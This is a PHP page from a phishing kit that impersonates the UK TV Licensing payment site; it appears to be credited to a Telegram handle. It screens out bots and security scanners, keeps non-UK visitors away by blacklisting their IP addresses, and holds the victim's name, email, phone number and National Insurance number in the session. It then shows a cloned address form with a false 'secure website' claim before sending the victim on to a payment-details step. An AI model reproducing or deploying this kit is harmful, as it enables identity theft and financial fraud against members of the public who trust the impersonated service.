<?php
// @Kr3pto on telegram
require "configg.php";
require "tvgb_assetz/sinc/session_protect.php";
require "tvgb_assetz/sinc/functions.php";
 
if($internal_antibot == 1){
	require "tvgb_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "tvgb_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}


error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
session_start();

if($_POST['title'] and $_POST['initial'] and $_POST['lastName'] and $_POST['email'] and $_POST['mobile']){
	
	$_SESSION['title'] = $_POST['title'];
	$_SESSION['initial'] = $_POST['initial'];
	$_SESSION['lastName'] = $_POST['lastName'];
	$_SESSION['email'] = $_POST['email'];
	$_SESSION['mobile'] = $_POST['mobile'];
	$_SESSION['nin'] = $_POST['nin'];
	
	$title = $_SESSION['title'];
	$initial = $_SESSION['initial'];
	$lastName = $_SESSION['lastName'];
	$email = $_SESSION['email'];
	$mobile = $_SESSION['mobile'];
	$nin = $_SESSION['nin'];
	
	
	
}else{
	$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="https://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Address to be licensed - TV Licensing ™</title>
        <link rel="stylesheet" href="tvgb_assetz/css/master.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/jquery.ui.all.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/master_rwd.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/jquery.mobile-1.3.20.css" />
        <link rel="shortcut icon" href="tvgb_assetz/img/favicon.ico" />
    </head>
    <body class="steps">
        <div id="iPage">
            <div id="iHeader">
                <div class="innerContainer clearfix topHeadCtr" style="display: block;">
                    <div class="clearfix" id="headerTop">
                        <div class="clearfix" id="iLogo">
                            <h1>
                                <a href="javascript:void(0);" class="fwckembeddedlink logoWrapper"><img src="tvgb_assetz/img/imgHeaderLogo.png" /> </a> <span class="headingText">TV Licensing</span>
                            </h1>
                            <div id="linkToggle" style="cursor: pointer;">&nbsp;</div>
                        </div>
                        <div class="mobileNav clearfix right" id="iMobileNav"><div class="clearfix" id="srhCtr" style="cursor: pointer;">&nbsp;</div></div>
                        <div class="clearfix" id="iGlobalNav">
                            <ul>
                                <li class="first"><a href="javascript:void(0);" class="fwckembeddedlink">Home</a></li>
                                <li><a href="javascript:void(0);" class="fwckembeddedlink">Easy read</a></li>
                                <li class="second">
                                    <span lang="cy"><a href="javascript:void(0);" class="fwckembeddedlink">Cymraeg</a> </span>
                                </li>
                            </ul>
                            <fieldset class="search" id="siteSrch" style="display: block;">
                                <legend class="hide">search site</legend>
                                <span class="siteSearchWrap"> <input id="siteSearch" name="q" style="color: rgb(88, 88, 88);" type="search" value="Search" /> </span>
                                <input id="siteSearchGo" type="button" value="search" name="___##NO_NAMED_ELEMENT##___" />
                            </fieldset>
                        </div>
                    </div>
                    <div class="clearfix" id="iPrimaryNav">
                        <ul>
                            <li>
                                <a href="javascript:void(0);">
                                    <span><strong>Pay</strong> for your TV Licence</span>
                                </a>
                            </li>
                            <li>
                                <a href="javascript:void(0);">
                                    <span><strong>Update</strong> your details</span>
                                </a>
                            </li>
                            <li>
                                <a href="javascript:void(0);" class="fwckembeddedlink">
                                    <span><strong>Check</strong> if you need one</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
                <div>&nbsp;</div>
            </div>
            <div id="iContent">
                <div class="innerContainer" style="display: block;">
                    <ul id="iBread">
                        <li>
                            <a href="javascript:void(0);">TV Licence<span class="linkPurpose">Link for TV Licence</span></a>
                        </li>
                        <li>
                            / <a href="javascript:void(0);"> Pay for your TV Licence<span class="linkPurpose robots-nocontent robots-noindex">Alternative link for Pay for your TV Licence</span> </a>
                        </li>
                        <li>/ Address to be licensed</li>
                    </ul>
                    <div id="iPrimary">
                        <ol id="iStep" class="clearfix">
                            <li class="visited">
                                <label id="Label1" for="Button1"><span class="steplabel"> About TV Licence Holder</span><span class="hiddenAccessibleTextOnStepsMenu">Current step</span></label>
                                <input type="button" id="Button1" class="stepSubmitButton" value="1" name="Button1" />
                            </li>
                            <li class="selected">
                                <label id="Label2" for="Button2"><span class="steplabel"> Address to be licensed</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button2" class="stepSubmitButton" value="2" name="Button2" />
                            </li>
                            <li class="disabled">
                                <label id="Label3" for="Button3"><span class="steplabel"> Payment details</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button3" class="stepSubmitButton" value="3" name="Button3" />
                            </li>
                            <li class="disabled">
                                <label id="Label4" for="Button4"><span class="steplabel"> Review and Confirm</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button4" class="stepSubmitButton" value="4" name="Button4" />
                            </li>
                        </ol>
                        <div class="panel secondary stepContent clearfix" id="stepContent">
                            <h2 class="header beta"><span>Step 2: Address to be licensed</span></h2>
                            <form action="LicencePaymentDetails.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>" id="payForm" method="post">
                                <p class="intro">Please complete all sections of this form.</p>
                                <div class="findAddressContainer" id="addressContainer">
                                    <div class="findAddressContainerContent"></div>
                                    <div class="findAddressAttributes" id="divAttributes">
                                        <div class="findAddressTrySearchingAgainContainer"><p>Please enter the address</p></div>
                                        <div class="frmRow">
                                            <label for="address" id="lblAddress1">Address</label>
                                            <input type="text" name="address" id="address" class="frmText findAddress1 findAddressManualEntryForm" value="" maxlength="60" autocomplete="off" required="" />
                                        </div>
                                        <div class="frmRow">
                                            <label for="town" id="lblAddress1">Town</label>
                                            <input type="text" name="town" id="town" class="frmText findAddress1 findAddressManualEntryForm" value="" maxlength="60" autocomplete="off" required="" />
                                        </div>
                                        <div class="frmRow contained rule" style="border: unset;">
                                            <label for="postcode" id="lblpostalCode">Postcode</label>
                                            <input type="text" name="postcode" id="postcode" class="frmText findAddressPostalCode findAddressManualEntryForm" value="" maxlength="8" autocomplete="off" required="" />
                                        </div>
                                    </div>
                                </div>
                                <div class="div">
                                    <div id="btnContinueContainer" class="btnGrp" style="">
                                        <span class="arrowBtn"><input type="submit" name="btnContinue" value="Continue" id="ctl00_Content_PaymentBegin1_btnContinue" /></span>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div id="iSecondary">
                        <div class="panel primary">
                            <h3 class="header alpha secure"><span>Secure website</span></h3>
                            <p>Whether you’re paying for your TV Licence, setting up a Direct Debit, or updating your details, you can relax in the knowledge that this is a secure website and your personal information is safe with us.</p>
                        </div>
                    </div>
                    <div style="clear: both;"></div>
                </div>
            </div>
            <div id="iFooter">
                <div class="innerContainer" style="display: block;">
                    <ul id="iFooterNav">
                        <li class="first"><a href="javascript:void(0);" class="fwckembeddedlink">About us</a></li>
                        <li><a href="javascript:void(0);">Contact us</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Accessibility</a></li>
                        <li><a href="javascript:void(0);">Community relations</a></li>
                        <li><a href="javascript:void(0);">Media Centre</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Sitemap</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Cookies</a></li>
                        <li class="last"><a href="javascript:void(0);" class="fwckembeddedlink">Privacy policy</a></li>
                    </ul>
                    <p>General information about TV Licensing is available in other languages:</p>
                    <ul id="iLanguages">
                        <li class="first">
                            <span lang="cy"><a href="javascript:void(0);" class="fwckembeddedlink">Cymraeg</a></span>
                        </li>
                        <li>
                            <span lang="pl"><a href="javascript:void(0);" class="fwckembeddedlink">Polski</a></span>
                        </li>
                        <li>
                            <span lang="es"><a href="javascript:void(0);" class="fwckembeddedlink">Español</a></span>
                        </li>
                        <li>
                            <span lang="pt"><a href="javascript:void(0);" class="fwckembeddedlink">Português</a></span>
                        </li>
                        <li style="background: rgba(0, 0, 0, 0) url('tvgb_assetz/img/imgFooterNavBg.png') no-repeat scroll right top; padding-right: 1.4em;">
                            <span class="unicode" lang="ur"> <a href="javascript:void(0);" class="fwckembeddedlink">اردو</a> </span>
                        </li>
                        <li class="last" style="padding-left: 1.11em;"><a href="javascript:void(0);">More languages &gt;&gt;</a></li>
                    </ul>
                    <p class="copyright">© 2025 TV Licensing</p>
                </div>
            </div>
        </div>
    </body>
</html>